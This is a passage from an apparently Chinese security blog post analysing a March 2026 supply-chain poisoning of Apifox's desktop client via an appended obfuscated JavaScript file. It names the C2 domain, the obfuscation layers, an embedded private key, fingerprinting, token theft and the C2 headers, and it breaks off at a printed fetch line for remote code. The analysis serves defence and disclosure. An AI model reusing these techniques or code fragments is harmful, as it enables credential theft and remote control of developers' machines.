---
title: Apifox 供应链投毒攻击 — 完整技术分析
url: https://rce.moe/2026/03/25/apifox-supply-chain-attack-analysis/
source: 白帽酱の博客
date: 2026-03-25
fetch_date: 2026-03-26T04:30:41.329571
---

# Apifox 供应链投毒攻击 — 完整技术分析

Toc

1. [一、概述](#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0)
   1. [关于 apifox.it.com 域名](#%E5%85%B3%E4%BA%8E-apifox-it-com-%E5%9F%9F%E5%90%8D)
   2. [被动 DNS 时间线](#%E8%A2%AB%E5%8A%A8-DNS-%E6%97%B6%E9%97%B4%E7%BA%BF)
2. [二、被投毒文件结构](#%E4%BA%8C%E3%80%81%E8%A2%AB%E6%8A%95%E6%AF%92%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84)
3. [三、混淆技术分析](#%E4%B8%89%E3%80%81%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90)
   1. [反混淆过程](#%E5%8F%8D%E6%B7%B7%E6%B7%86%E8%BF%87%E7%A8%8B)
4. [四、反混淆后的恶意代码分析](#%E5%9B%9B%E3%80%81%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%90%8E%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)
   1. [4.1 嵌入 RSA-2048 私钥](#4-1-%E5%B5%8C%E5%85%A5-RSA-2048-%E7%A7%81%E9%92%A5)
   2. [4.2 机器指纹采集](#4-2-%E6%9C%BA%E5%99%A8%E6%8C%87%E7%BA%B9%E9%87%87%E9%9B%86)
   3. [4.3 Apifox 用户凭证窃取](#4-3-Apifox-%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81%E7%AA%83%E5%8F%96)
   4. [4.4 C2 通信协议](#4-4-C2-%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE)
   5. [4.5 远程代码执行](#4-5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)
   6. [4.6 持久化机制](#4-6-%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6)
5. [五、攻击载荷深度分析](#%E4%BA%94%E3%80%81%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90)
   1. [5.1 Stage-1：加载器（Loader）](#5-1-Stage-1%EF%BC%9A%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Loader%EF%BC%89)
   2. [5.2 Stage-2 v1：信息窃取（collectPreInformations）](#5-2-Stage-2-v1%EF%BC%9A%E4%BF%A1%E6%81%AF%E7%AA%83%E5%8F%96%EF%BC%88collectPreInformations%EF%BC%89)
      1. [窃取目标](#%E7%AA%83%E5%8F%96%E7%9B%AE%E6%A0%87)
      2. [数据外泄协议](#%E6%95%B0%E6%8D%AE%E5%A4%96%E6%B3%84%E5%8D%8F%E8%AE%AE)
   3. [5.3 Stage-2 v2：纵深窃取（collectAddInformations）](#5-3-Stage-2-v2%EF%BC%9A%E7%BA%B5%E6%B7%B1%E7%AA%83%E5%8F%96%EF%BC%88collectAddInformations%EF%BC%89)
   4. [5.4 关于 Stage-2 代码中的中文注释](#5-4-%E5%85%B3%E4%BA%8E-Stage-2-%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%B3%A8%E9%87%8A)
   5. [5.5 未捕获的后续阶段：完整的灵活 C2 平台](#5-5-%E6%9C%AA%E6%8D%95%E8%8E%B7%E7%9A%84%E5%90%8E%E7%BB%AD%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%AE%8C%E6%95%B4%E7%9A%84%E7%81%B5%E6%B4%BB-C2-%E5%B9%B3%E5%8F%B0)
6. [六、完整攻击链](#%E5%85%AD%E3%80%81%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE)
7. [七、C2 服务器行为特征](#%E4%B8%83%E3%80%81C2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A1%8C%E4%B8%BA%E7%89%B9%E5%BE%81)
   1. [观测到的 Stage-2 URL 样本](#%E8%A7%82%E6%B5%8B%E5%88%B0%E7%9A%84-Stage-2-URL-%E6%A0%B7%E6%9C%AC)
8. [八、IoCs（攻陷指标）](#%E5%85%AB%E3%80%81IoCs%EF%BC%88%E6%94%BB%E9%99%B7%E6%8C%87%E6%A0%87%EF%BC%89)
   1. [网络指标](#%E7%BD%91%E7%BB%9C%E6%8C%87%E6%A0%87)
   2. [主机指标](#%E4%B8%BB%E6%9C%BA%E6%8C%87%E6%A0%87)
   3. [加密指标](#%E5%8A%A0%E5%AF%86%E6%8C%87%E6%A0%87)
9. [九、Wayback Machine 存档](#%E4%B9%9D%E3%80%81Wayback-Machine-%E5%AD%98%E6%A1%A3)
10. [十、受影响范围与风险评估](#%E5%8D%81%E3%80%81%E5%8F%97%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4%E4%B8%8E%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0)
    1. [受影响人群](#%E5%8F%97%E5%BD%B1%E5%93%8D%E4%BA%BA%E7%BE%A4)
    2. [风险等级：🔴 严重（Critical）](#%E9%A3%8E%E9%99%A9%E7%AD%89%E7%BA%A7%EF%BC%9A%F0%9F%94%B4-%E4%B8%A5%E9%87%8D%EF%BC%88Critical%EF%BC%89)
11. [十一、攻击时间线总览](#%E5%8D%81%E4%B8%80%E3%80%81%E6%94%BB%E5%87%BB%E6%97%B6%E9%97%B4%E7%BA%BF%E6%80%BB%E8%A7%88)
12. [十二、处置建议](#%E5%8D%81%E4%BA%8C%E3%80%81%E5%A4%84%E7%BD%AE%E5%BB%BA%E8%AE%AE)
    1. [紧急措施](#%E7%B4%A7%E6%80%A5%E6%8E%AA%E6%96%BD)
    2. [检测方法](#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95)
    3. [长期建议](#%E9%95%BF%E6%9C%9F%E5%BB%BA%E8%AE%AE)
13. [十三、总结](#%E5%8D%81%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93)

Toc

**0** results found
![](/images/logo.jpeg)

[首页](/)
[归档](/archives)
[分类](/categories)
[标签](/tags)
[友链](/friends)
[关于](/about)

白帽酱

白帽酱

[首页](/)
[归档](/archives)
[分类](/categories)
[标签](/tags)
[友链](/friends)
[关于](/about)

Apifox 供应链投毒攻击 — 完整技术分析

2026/03/25

[WEB](/categories/WEB)

## 一、概述

近日，工作中监测到 Apifox 文件存在被投毒情况。

[Apifox](https://apifox.com/) 是一款 API 一体化协作平台，其桌面端应用基于 **Electron** 框架开发，提供 **Windows、macOS、Linux** 三平台客户端。因未严格启用 `sandbox` 参数，并暴露了 Node.js 的 API 接口，导致攻击者可通过 JS 控制 Apifox 的终端——**三个平台均受影响**。

Apifox 在启动过程中会加载：

|  |
| --- |
| ``` hxxps://cdn[.]apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js ``` |

该文件正常大小为 **34KB**，但在 **3 月 4 日之后**可能会请求到被投毒的版本（**77KB**）。被投毒的 JS 文件会动态加载 `hxxps://apifox[.]it[.]com/public/apifox-event.js`（该域名非官方域名），在满足特定条件下加载攻击载荷，采集主机系统环境和敏感信息（SSH 密钥、Git 凭证、命令行历史、进程列表），上报到 `hxxps://apifox[.]it[.]com/event/0/log`。后续攻击者会控制主机拉取执行后门程序，并尝试发起横向攻击，控制更多有价值目标。

目前入口文件已被还原，仅在 [Wayback Machine 存档](https://web.archive.org/web/20260305160602/https%3A//cdn.apifox.com/www/assets/js/user-tracking.min.js)中可见投毒版本。

### 关于 `apifox.it.com` 域名

攻击者使用的 C2 域名 `apifox.it.com` 极具迷惑性，值得单独说明。

`.it.com` 并非意大利国别域名 `.it` 的子域，而是一个**商业性质的二级域名服务**，由 `it.com` 域名持有者提供类似”子域名注册”的商业服务。它不属于 ICANN 标准注册局体系，不受标准 gTLD/ccTLD 监管约束，**无公开 WHOIS 信息可查**，注册门槛极低，非常适合被攻击者滥用。

从受害者视角来看，`apifox.it.com` 在第一眼很容易被误认为：

* Apifox 的**内部测试/研发域名**（类似 `apifox.internal.com`）
* Apifox **意大利区域**的服务域名
* Apifox 官方的某个子产品域名

这种域名选择体现了攻击者在**社会工程学**层面的精心设计——利用域名的视觉相似性和 `.it.com` 的模糊属性来降低被怀疑的概率。

### 被动 DNS 时间线

通过被动 DNS 查询，`apifox[.]it[.]com` 的历史 A 记录如下：

| IP 地址 | 所属组织 | 首次发现 | 最后发现 | 持续时间 |
| --- | --- | --- | --- | --- |
| `104.21.2.104` | Cloudflare, Inc. | 2026-03-04 | 2026-03-22 | **18 天** |
| `172.67.129.21` | Cloudflare, Inc. | 2026-03-04 | 2026-03-22 | **18 天** |

无 AAAA（IPv6）记录，攻击者未配置 IPv6 解析。

关键时间节点：

|  |
| --- |
| ``` 2026-03-04  域名解析上线（Cloudflare 托管），投毒开始      │      ├── 03-04 ~ 03-22  活跃期（18天），通过 Cloudflare CDN 分发恶意载荷      │ 2026-03-22  DNS 记录下线，域名不再解析      │ 2026-03-25  验证时 DNS 已失效，但源站 IP 仍在响应（C2 后端未关闭） ``` |

攻击者利用 **Cloudflare** 作为前置 CDN 代理，既隐藏了真实源站 IP，又获得了合法的 HTTPS 证书和全球加速能力，使恶意流量在网络层面更难以与正常 CDN 流量区分。DNS 记录在活跃 18 天后被移除，可能是攻击者主动撤收、也可能是被 Cloudflare 或域名服务商处置。

---

## 二、被投毒文件结构

投毒后的 `apifox-app-event-tracking.min.js`（77KB）由两部分组成：

| 区域 | 大小 | 内容 |
| --- | --- | --- |
| 第一部分 | ~34KB | **合法** Apifox 事件追踪 SDK（Webpack 打包） |
| 第二部分 | ~42KB | **⚠️ 恶意后门代码**（严重混淆） |

合法 SDK 包含 GA4、百度统计、阿里云 SLS、PostHog 等多平台事件追踪模块，本身不存在恶意行为。攻击者在该文件末尾**追加**了约 42KB 的严重混淆 JavaScript 代码。

> 注：通过 Wayback Machine 存档获取的版本头部包含约 1KB 的 wombat 代理包装器代码，这是 Wayback Machine 自动注入的回放层，并非投毒文件本身的内容。

---

## 三、混淆技术分析

恶意代码采用了 **7 层混淆**，逆向难度极高：

| 技术 | 说明 |
| --- | --- |
| 字符串数组旋转 | `_0x10e4()` 函数返回 300+ 条编码字符串，通过 IIFE 暴力旋转数组到目标偏移 |
| Base64 + RC4 双层解密 | `_0x3fb9()` 解码器对字符串先 Base64 解码，再 RC4 解密还原明文 |
| 代理函数 | `_0x2c838a`、`_0x15440c` 等函数包装解码器，增加间接调用层次 |
| 十六进制算术混淆 | 所有数值常量使用复杂十六进制算术表达式（如 `0x2425+-0x1*-0x415+0x80b*-0x5` 表示简单数字） |
| 控制流扁平化 | 通过对象属性间接调用函数，打乱执行逻辑顺序 |
| 死代码注入 | 大量永远不会执行的代码分支，增加分析干扰 |
| 反调试陷阱 | `toString` 正则检测 + 条件无限递归，检测到调试器则触发死循环 |

### 反混淆过程

通过精确复现 Base64 解码和 RC4 解密逻辑，暴力枚举字符串数组的旋转偏移量（最终确定为偏移 275），成功解密全部 300+ 条编码字符串，还原出完整的恶意代码逻辑。

---

## 四、反混淆后的恶意代码分析

完整还原后的恶意代码为纯 Node.js 脚本，核心功能如下：

### 4.1 嵌入 RSA-2048 私钥

恶意代码中硬编码了一个 RSA-2048 私钥（PKCS#8 格式，1703 字符），用于：

* **加密**上报的敏感信息：从私钥中提取公钥，使用 `publicEncrypt`（OAEP 填充）加密后附加到 HTTP 请求头
* **解密** C2 服务器下发的指令：使用 `privateDecrypt`（OAEP + SHA-256）解密 Stage-1 payload

|  |
| --- |
| ``` const PRIVATE_KEY = `-----BEGIN PRIVATE KEY----- MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDOPeHTeyrblELD O/JYR80HQvCZMd6QEOmHNdI9tTQfVNHvU/31MhMymSQMq2cCx5+RbJ1fSQ9/5rkx ...（共 24 行）... 1HPFW7rGjV82Fu3No+rLjlo= -----END PRIVATE KEY-----`; ``` |

> 注：攻击者将私钥嵌入客户端代码，这使得任何获取该代码的人都能解密 C2 通信——这是攻击者的设计失误，也是本次分析能够完整还原攻击链的关键。

### 4.2 机器指纹采集

恶意代码通过以下字段构造机器唯一标识：

|  |
| --- |
| ``` MAC地址 + CPU型号 + 主机名 + 用户主目录 + 操作系统平台 ``` |

将拼接的字符串进行 SHA-256 哈希，得到 64 字符的十六进制指纹（`af_uuid`），存储在 `localStorage` 的 `_rl_mc` 键中。

### 4.3 Apifox 用户凭证窃取

恶意代码从 `localStorage` 读取 `common.accessToken`（Apifox 登录令牌），利用该令牌调用官方 API 获取用户信息：

|  |
| --- |
| ``` GET hxxps://api[.]apifox[.]com/api/v1/user Authorization: <accessToken> ``` |

从响应中提取用户 **邮箱** 和 **姓名**，经 RSA 加密后附加到后续请求头中。

### 4.4 C2 通信协议

恶意代码向 C2 服务器发送带有以下自定义 HTTP 头的请求：

| Header 字段 | 内容 | 加密方式 |
| --- | --- | --- |
| `af_uuid` | 机器指纹 SHA-256 | 明文 |
| `af_os` | 操作系统类型 + 版本号 | 明文 |
| `af_user` | 用户主目录路径 | RSA-2048 OAEP |
| `af_name` | 主机名 | RSA-2048 OAEP |
| `af_apifox_user` | Apifox 账户邮箱 | RSA-2048 OAEP |
| `af_apifox_name` | Apifox 账户姓名 | RSA-2048 OAEP |

### 4.5 远程代码执行

|  |
| --- |
| ``` const r = await fetch(REMOTE_J...